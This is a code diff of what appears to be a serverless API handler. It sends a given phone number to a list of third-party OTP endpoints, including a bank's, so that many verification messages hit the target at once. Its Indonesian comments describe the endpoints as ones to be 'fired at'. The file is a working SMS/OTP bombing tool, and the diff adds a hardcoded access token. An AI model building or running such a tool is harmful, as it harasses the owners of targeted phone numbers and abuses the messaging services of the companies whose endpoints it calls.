@@ -1,22 +1,26 @@
 export default async function handler(req, res) {
-    // Set CORS biar bisa diakses dari mana aja
+    // Set CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST');
     
+    // Cek Token FloX (Opsional, biar sama kayak FloX)
+    const token = req.headers['x-paradox-token'];
+    if (token !== 'PARADOX_SUPER_SECRET_998877') {
+        return res.status(401).json({ error: 'Unauthorized: Token Invalid' });
+    }
+
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method Not Allowed' });
     }
 
-    const { phone } = req.body;
-    if (!phone) {
-        return res.status(400).json({ error: 'Nomor HP wajib diisi' });
+    const { action, phone } = req.body;
+    if (action !== 'request_otp' || !phone) {
+        return res.status(400).json({ error: 'Bad Request: Invalid format' });
     }
 
-    // Format nomor ke 62
     let nomor = phone;
     if (nomor.startsWith('0')) nomor = '62' + nomor.slice(1);
 
-    // Daftar Endpoint OTP yang bakal ditembak
     const endpoints = [
         "https://api.bri.co.id/v1/otp",
         "https://api.misteraladin.com/v1/otp",
@@ -29,24 +33,13 @@ export default async function handler(req, res) {
     ];
 
     let results = [];
-    
     for (let url of endpoints) {
         try {
             const response = await fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
-                    'Origin': 'https://www.google.com',
-                    'Referer': 'https://www.google.com/'
-                },
-                body: JSON.stringify({
-                    phone: nomor,
-                    msisdn: nomor,
-                    phone_number: nomor
-                })
+                headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0' },
+                body: JSON.stringify({ phone: nomor, msisdn: nomor, phone_number: nomor })
             });
-            
             results.push({ url, status: response.status });
         } catch (e) {
             results.push({ url, status: 'error' });
@@ -54,8 +47,8 @@ export default async function handler(req, res) {
     }
 
     return res.status(200).json({ 
-        message: 'OTP berhasil ditembak',
-        target: nomor,
+        status: true,
+        message: 'OTP successfully sent',
         results: results
     });
 }
